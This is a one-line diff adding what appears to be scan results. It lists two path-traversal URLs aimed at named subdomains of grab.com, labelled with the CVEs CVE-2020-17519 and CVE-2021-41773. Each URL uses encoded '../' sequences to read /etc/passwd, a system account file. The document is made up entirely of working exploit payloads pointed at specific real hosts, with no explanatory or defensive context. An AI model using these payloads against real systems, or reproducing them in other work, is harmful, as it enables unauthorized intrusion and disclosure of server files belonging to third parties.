@@ -1,0 +1,1 @@
+http://m.grab.com/cgi-bin/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd, CVE-2020-17519-1 http://uat2.qms.grab.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd, CVE-2021-41773 
